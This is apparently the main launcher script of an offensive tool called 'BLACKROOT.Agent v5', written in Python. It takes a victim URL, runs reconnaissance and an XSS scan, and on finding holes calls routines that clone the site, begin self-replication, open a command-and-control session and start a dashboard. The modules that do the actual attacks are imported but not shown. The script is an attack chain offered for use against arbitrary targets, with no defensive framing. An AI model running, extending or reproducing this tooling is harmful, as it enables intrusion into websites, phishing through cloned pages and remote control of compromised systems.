import sys
import os
sys.path.append(os.path.abspath('assimilate/neuro-assimilator-enhanced/src'))
import argparse
import json
from kernel.core import BlackrootKernel, register_module
from security.security_manager import SecurityManager
from reliability.reliability_monitor import ReliabilityMonitor
from performance.performance_profiler import PerformanceProfiler
from extensibility.plugin_manager import PluginManager
from rust_integration.rust_handler import RustScriptHandler
from recon.scanner import ReconModule
from mimic.site_cloner import clone_site
from core.dashboard import start_dashboard
from core.replication import begin_replication
from core.commander import initiate_c2_session
from ghost_layer import advanced_recon
from black_vault import BlackVault
from swarm_mesh import SwarmMesh
from redis import Redis

def main():
    banner = """
     ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ████████╗
    ██╔════╝ ██║     ██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
    ██║  ███╗██║     ███████║██║     █████╔╝ ██████╔╝██║   ██║██║   ██║   ██║   
    ██║   ██║██║     ██╔══██║██║     ██╔═██╗ ██╔═══╝ ██║   ██║██║   ██║   ██║   
    ╚██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║     ╚██████╔╝╚██████╔╝   ██║   
     ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝      ╚═════╝  ╚═════╝    ╚═╝   
             BLACKROOT.Agent v5 — Shadow Intelligence Swarm
    """
    print(banner)

    parser = argparse.ArgumentParser(description="BLACKROOT.Agent v5 - Swarm Mode Execution")
    parser.add_argument('--target', required=True, help='Target URL (e.g., https://victim.com)')
    parser.add_argument('--silent', action='store_true', help='Run cloner in silent mode')
    parser.add_argument('--config', default='config.json', help='Path to configuration file')
    args = parser.parse_args()

    print(f"[🕷️] Target Acquired: {args.target}")
    config = load_config(args.config)
    # Initialize kernel and all subsystems
    kernel = BlackrootKernel(config)
    subsystems = {
        'security_manager': SecurityManager(),
        'reliability_monitor': ReliabilityMonitor(),
        'performance_profiler': PerformanceProfiler(),
        'plugin_manager': PluginManager(manifest_path="/tmp/plugins.yaml"),
        'rust_handler': RustScriptHandler(),
        'recon_module': ReconModule(kernel.black_vault, kernel.swarm, kernel.swarm.redis)
    }
    # Register subsystems globally
    register_module("security", subsystems['security_manager'].analyze_and_execute)
    register_module("reliability", subsystems['reliability_monitor'].rollback_codex)
    register_module("performance", subsystems['performance_profiler'].log_performance)
    register_module("plugin", subsystems['plugin_manager'].register_plugin)
    register_module("rust", subsystems['rust_handler'].handle_rust_code)
    register_module("recon", subsystems['recon_module'].advanced_recon)

    # Main execution flow
    recon_report = subsystems['recon_module'].advanced_recon(args.target)
    endpoints = recon_report.get('endpoints', [])
    print(f"[ℹ️] Recon found {len(endpoints)} endpoints.")
    xss_results = subsystems['recon_module'].scan_for_xss(args.target, endpoints)

    if any(xss_results[url] for url in xss_results):
        print("[✔️] XSS vulnerabilities detected. Proceeding with exploitation modules...")
        clone_site(args.target, silent=args.silent)
        begin_replication(args.target, config)
        initiate_c2_session()
        start_dashboard()
        # Example: plugin usage
        # subsystems['plugin_manager'].register_plugin('example', {'type': 'python_script', 'source': 'print("Hello")'})
        # Example: rust integration
        # rust_result = subsystems['rust_handler'].handle_rust_code('fn main() { println!("Hello from Rust"); }')
        # print(rust_result)
        # Example: reliability rollback
        # subsystems['reliability_monitor'].rollback_codex()
        # Example: performance logging
        # subsystems['performance_profiler'].log_performance(10.0, 256.0, 0.5)
    else:
        print("[⚠️] No injection vectors found. Expand scan or use external exploit toolkit.")

# Load configuration from a JSON file
def load_config(config_file):
    with open(config_file, 'r') as file:
        return json.load(file)

if __name__ == "__main__":
    main()
